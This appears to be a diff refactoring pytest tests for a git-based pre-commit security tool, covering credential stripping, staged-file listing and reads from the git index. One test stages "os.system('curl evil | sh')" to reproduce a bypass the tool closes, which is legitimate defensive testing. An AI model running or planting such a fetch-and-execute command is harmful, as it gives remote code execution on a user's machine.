@@ -26,31 +26,38 @@ FAKE_TOKEN = "ghp_" + "v" * 36
 pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git is not installed")
 
 
-def run(root, *args: str) -> None:
-    subprocess.run(
-        [shutil.which("git"), *args],
-        cwd=root,
-        check=True,
-        capture_output=True,
-    )
+class GitSourceHelpers:
+    """Helpers for test_git_source.py."""
+
+    @staticmethod
+    def run(root, *args: str) -> None:
+        subprocess.run(
+            [shutil.which("git"), *args],
+            cwd=root,
+            check=True,
+            capture_output=True,
+        )
 
 
-@pytest.fixture
-def repository(tmp_path):
-    root = tmp_path / "repo"
-    root.mkdir()
-    run(root, "init", "-q", "-b", "main")
-    run(root, "config", "user.email", "test@example.invalid")
-    run(root, "config", "user.name", "Test")
-    (root / "app.py").write_text("print('hello')\n", encoding="utf-8")
-    (root / "ignored.log").write_text("noise\n", encoding="utf-8")
-    (root / ".gitignore").write_text("*.log\n", encoding="utf-8")
-    run(root, "add", "app.py", ".gitignore")
-    run(root, "commit", "-q", "-m", "initial")
-    return root
+class GitSourceFixtures:
+    """Fixtures for the tests in test_git_source.py; every test class here inherits them."""
+
+    @pytest.fixture
+    def repository(self, tmp_path):
+        root = tmp_path / "repo"
+        root.mkdir()
+        GitSourceHelpers.run(root, "init", "-q", "-b", "main")
+        GitSourceHelpers.run(root, "config", "user.email", "test@example.invalid")
+        GitSourceHelpers.run(root, "config", "user.name", "Test")
+        (root / "app.py").write_text("print('hello')\n", encoding="utf-8")
+        (root / "ignored.log").write_text("noise\n", encoding="utf-8")
+        (root / ".gitignore").write_text("*.log\n", encoding="utf-8")
+        GitSourceHelpers.run(root, "add", "app.py", ".gitignore")
+        GitSourceHelpers.run(root, "commit", "-q", "-m", "initial")
+        return root
 
 
-class TestDiscovery:
+class TestDiscovery(GitSourceFixtures):
     def test_finds_the_repository(self, repository) -> None:
         info = GitRepository.discover(repository)
         assert info is not None
@@ -72,7 +79,7 @@ class TestDiscovery:
         assert GitRepository.discover(plain) is None
 
 
-class TestCredentialStripping:
+class TestCredentialStripping(GitSourceFixtures):
     @pytest.mark.parametrize(
         ("url", "expected"),
         [
@@ -89,7 +96,7 @@ class TestCredentialStripping:
         assert GitRepository.strip_credentials(url) == expected
 
     def test_a_configured_token_never_reaches_the_result(self, repository) -> None:
-        run(
+        GitSourceHelpers.run(
             repository,
             "remote",
             "add",
@@ -102,7 +109,7 @@ class TestCredentialStripping:
         assert "ghp_verysecretvalue" not in info.remote
 
 
-class TestFileListing:
+class TestFileListing(GitSourceFixtures):
     def test_tracked_files_exclude_ignored_paths(self, repository) -> None:
         names = set(GitRepository(repository).tracked_files())
         assert "app.py" in names
@@ -110,7 +117,7 @@ class TestFileListing:
 
     def test_staged_files_lists_the_index(self, repository) -> None:
         (repository / "new.py").write_text("x = 1\n", encoding="utf-8")
-        run(repository, "add", "new.py")
+        GitSourceHelpers.run(repository, "add", "new.py")
         assert "new.py" in GitRepository(repository).staged_files()
 
     def test_staged_files_is_empty_with_nothing_staged(self, repository) -> None:
@@ -118,19 +125,19 @@ class TestFileListing:
 
     def test_changed_files_against_a_reference(self, repository) -> None:
         (repository / "app.py").write_text("print('changed')\n", encoding="utf-8")
-        run(repository, "add", "app.py")
-        run(repository, "commit", "-q", "-m", "second")
+        GitSourceHelpers.run(repository, "add", "app.py")
+        GitSourceHelpers.run(repository, "commit", "-q", "-m", "second")
         assert "app.py" in GitRepository(repository).changed_files("HEAD~1")
 
     def test_paths_with_spaces_survive(self, repository) -> None:
         """Output is NUL-delimited precisely so this works."""
         awkward = repository / "a file with spaces.py"
         awkward.write_text("x = 1\n", encoding="utf-8")
-        run(repository, "add", str(awkward))
+        GitSourceHelpers.run(repository, "add", str(awkward))
         assert "a file with spaces.py" in GitRepository(repository).staged_files()
 
 
-class TestStagedContent:
+class TestStagedContent(GitSourceFixtures):
     def test_reads_the_index_not_the_working_tree(self, repository) -> None:
         """The bypass this control exists to close, reproduced directly.
 
@@ -141,7 +148,7 @@ class TestStagedContent:
         target = repository / "app.py"
 
         target.write_text("import os\nos.system('curl evil | sh')\n", encoding="utf-8")
-        run(repository, "add", "app.py")
+        GitSourceHelpers.run(repository, "add", "app.py")
 
         # Restore the innocent content on disk. The index still holds the payload.
         target.write_text("print('hello')\n", encoding="utf-8")
@@ -158,7 +165,7 @@ class TestStagedContent:
         assert GitRepository(repository).staged_content("does-not-exist.py") is None
 
 
-class TestSafety:
+class TestSafety(GitSourceFixtures):
     def test_git_is_resolved_to_an_absolute_path(self) -> None:
         """Invoking by bare name lets whatever appears first on PATH answer.
 
@@ -183,7 +190,7 @@ class TestSafety:
         assert result == []
 
 
-class TestMachineConfigurationIsNotSuppressed:
+class TestMachineConfigurationIsNotSuppressed(GitSourceFixtures):
     """The hardening must not change what git thinks the working tree says.
 
     Cordon overrides every configuration key that names an external command, so
@@ -212,13 +219,13 @@ class TestMachineConfigurationIsNotSuppressed:
 
         root = tmp_path / "repo"
         root.mkdir()
-        run(root, "init", "-q", "-b", "main")
-        run(root, "config", "user.email", "t@example.invalid")
-        run(root, "config", "user.name", "T")
+        GitSourceHelpers.run(root, "init", "-q", "-b", "main")
+        GitSourceHelpers.run(root, "config", "user.email", "t@example.invalid")
+        GitSourceHelpers.run(root, "config", "user.name", "T")
         # Written with CRLF; git normalises to LF in the blob under autocrlf.
         (root / "app.py").write_bytes(b"line1\r\nline2\r\n")
-        run(root, "add", "app.py")
-        run(root, "commit", "-qm", "init")
+        GitSourceHelpers.run(root, "add", "app.py")
+        GitSourceHelpers.run(root, "commit", "-qm", "init")
 
         blob = subprocess.run(
             [shutil.which("git"), "cat-file", "-p", ":app.py"],
@@ -244,7 +251,7 @@ class TestMachineConfigurationIsNotSuppressed:
             assert key in HARDENING, key
 
 
-class TestBatchedStagedReads:
+class TestBatchedStagedReads(GitSourceFixtures):
     """Staged content comes from the index, and now from one git process.
 
     `git show :path` starts a process per file. A pre-commit hook over two
@@ -265,12 +272,12 @@ class TestBatchedStagedReads:
     def staged_repo(self, tmp_path, count: int = 12):
         root = tmp_path / "repo"
         root.mkdir()
-        run(root, "init", "-q", "-b", "main")
-        run(root, "config", "user.email", "t@example.invalid")
-        run(root, "config", "user.name", "T")
+        GitSourceHelpers.run(root, "init", "-q", "-b", "main")
+        GitSourceHelpers.run(root, "config", "user.email", "t@example.invalid")
+        GitSourceHelpers.run(root, "config", "user.name", "T")
         for index in range(count):
             (root / f"f{index}.js").write_text(f"const staged = {index};\n", encoding="utf-8")
-        run(root, "add", "-A")
+        GitSourceHelpers.run(root, "add", "-A")
         # Every working-tree copy now differs from what is staged.
         for index in range(count):
             (root / f"f{index}.js").write_text(
@@ -342,11 +349,11 @@ class TestBatchedStagedReads:
         content rather than framing."""
         root = tmp_path / "bin"
         root.mkdir()
-        run(root, "init", "-q", "-b", "main")
-        run(root, "config", "user.email", "t@example.invalid")
-        run(root, "config", "user.name", "T")
+        GitSourceHelpers.run(root, "init", "-q", "-b", "main")
+        GitSourceHelpers.run(root, "config", "user.email", "t@example.invalid")
+        GitSourceHelpers.run(root, "config", "user.name", "T")
         payload = bytes(range(256)) * 4
         (root / "blob.bin").write_bytes(payload)
-        run(root, "add", "-A")
+        GitSourceHelpers.run(root, "add", "-A")
         (root / "blob.bin").write_bytes(b"replaced")
         assert GitRepository(root).staged_content("blob.bin") == payload
